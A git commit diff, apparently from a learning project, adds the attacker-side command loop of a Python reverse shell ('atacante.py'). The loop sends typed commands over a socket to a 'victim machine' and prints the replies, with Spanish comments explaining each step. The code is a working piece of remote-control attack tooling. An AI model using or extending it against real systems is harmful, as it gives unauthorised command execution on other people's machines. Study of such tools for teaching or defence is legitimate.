faf56e5ccf3ab6e42608d4737937cce2e89ad182
JoseGeek78 <josemariarodriguez78@gmail.com>
2024-10-11 16:29:41 +0200

    .

--- ReverseShell/atacante.py
+++ ReverseShell/atacante.py
@@ -13,3 +13,21 @@ while estado:
 
     # Solicitamos al usuario que introduzca un comando
     comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
+    
+    
+    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
+    if comando_enviar == 'exit':
+        # Le decimos al servidor que la conexion la cerramos:
+        client_socket.send(comando_enviar.encode())
+        # Cerramos el socket, que se volverá a abrir al inicio del bucle:
+        client_socket.close()
+        estado = False
+    else:
+        # Enviamos el comando a la máquina víctima:
+        client_socket.send(comando_enviar.encode())
+
+        # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
+        respuesta = client_socket.recv(4096)
+
+        # Imprimimos la respuesta;
+        print(respuesta.decode()) 
